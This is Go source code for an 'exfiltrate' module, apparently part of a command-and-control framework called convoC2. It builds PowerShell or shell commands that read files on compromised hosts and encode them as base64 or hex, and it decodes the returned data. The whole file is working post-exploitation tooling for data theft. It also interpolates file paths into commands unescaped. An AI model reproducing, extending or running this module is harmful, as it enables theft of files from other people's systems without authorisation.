package modules

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// ExfiltrateModule is a module for exfiltrating files from compromised hosts
type ExfiltrateModule struct {
	*BaseModule
}

// NewExfiltrateModule creates a new data exfiltration module
func NewExfiltrateModule() *ExfiltrateModule {
	base := NewBaseModule(
		"exfiltrate",
		"Exfiltrates files from compromised hosts",
		"convoC2 Team",
	)

	base.RegisterOption("path", "Path of the file to exfiltrate", "", true)
	base.RegisterOption("chunks", "Split file into chunks of N bytes (0 for no splitting)", "1048576", false)
	base.RegisterOption("encode", "Encoding to use (base64, hex, none)", "base64", false)

	return &ExfiltrateModule{
		BaseModule: base,
	}
}

// Run executes the exfiltration module
func (m *ExfiltrateModule) Run(agentID string) (string, error) {
	if err := m.ValidateOptions(); err != nil {
		return "", err
	}

	filePath, _ := m.GetOption("path")
	chunksStr, _ := m.GetOption("chunks")
	encode, _ := m.GetOption("encode")

	// Build the exfiltration command
	command := buildExfiltrateCommand(filePath, chunksStr, encode)

	// The actual exfiltration would be performed by sending this command
	// to the agent specified by agentID. For now, we just return the command
	// that would be executed.
	return command, nil
}

// buildExfiltrateCommand builds the command for the target OS
func buildExfiltrateCommand(filePath, chunksStr, encode string) string {
	var command strings.Builder

	// Check if the path indicates Windows (contains backslashes and/or drive letter)
	isWindows := strings.Contains(filePath, "\\") || (len(filePath) > 1 && filePath[1] == ':')

	if isWindows {
		command.WriteString("powershell -Command \"")
		command.WriteString(fmt.Sprintf("if (Test-Path '%s') {", filePath))
		command.WriteString(fmt.Sprintf("$content = [System.IO.File]::ReadAllBytes('%s');", filePath))

		switch strings.ToLower(encode) {
		case "base64":
			command.WriteString("$encoded = [Convert]::ToBase64String($content);")
		case "hex":
			command.WriteString("$encoded = -join ($content | ForEach-Object { $_.ToString('X2') });")
		default:
			command.WriteString("$encoded = [System.Text.Encoding]::UTF8.GetString($content);")
		}

		command.WriteString("$encoded")
		command.WriteString("} else { Write-Output 'File not found' }")
		command.WriteString("\"")
	} else {
		// Linux/Unix command
		command.WriteString("if [ -f \"")
		command.WriteString(filePath)
		command.WriteString("\" ]; then ")

		switch strings.ToLower(encode) {
		case "base64":
			command.WriteString("base64 \"")
			command.WriteString(filePath)
			command.WriteString("\"")
		case "hex":
			command.WriteString("hexdump -v -e '1/1 \"%02X\"' \"")
			command.WriteString(filePath)
			command.WriteString("\"")
		default:
			command.WriteString("cat \"")
			command.WriteString(filePath)
			command.WriteString("\"")
		}

		command.WriteString("; else echo \"File not found\"; fi")
	}

	return command.String()
}

// ProcessExfiltratedData handles the received exfiltrated data
func ProcessExfiltratedData(data string, encode string) ([]byte, error) {
	switch strings.ToLower(encode) {
	case "base64":
		return base64.StdEncoding.DecodeString(data)
	case "hex":
		return hexDecode(data)
	default:
		return []byte(data), nil
	}
}

// hexDecode decodes a hex string to bytes
func hexDecode(hexStr string) ([]byte, error) {
	// Remove any whitespace
	hexStr = strings.ReplaceAll(hexStr, " ", "")
	hexStr = strings.ReplaceAll(hexStr, "\n", "")
	hexStr = strings.ReplaceAll(hexStr, "\r", "")

	if len(hexStr)%2 != 0 {
		return nil, fmt.Errorf("hex string has odd length")
	}

	bytes := make([]byte, len(hexStr)/2)
	for i := 0; i < len(hexStr); i += 2 {
		var high, low byte

		high = hexCharToByte(hexStr[i])
		low = hexCharToByte(hexStr[i+1])

		if high > 15 || low > 15 {
			return nil, fmt.Errorf("invalid hex character at position %d", i)
		}

		bytes[i/2] = high<<4 | low
	}

	return bytes, nil
}

// hexCharToByte converts a hex character to a byte
func hexCharToByte(c byte) byte {
	switch {
	case '0' <= c && c <= '9':
		return c - '0'
	case 'a' <= c && c <= 'f':
		return c - 'a' + 10
	case 'A' <= c && c <= 'F':
		return c - 'A' + 10
	default:
		return 255
	}
}
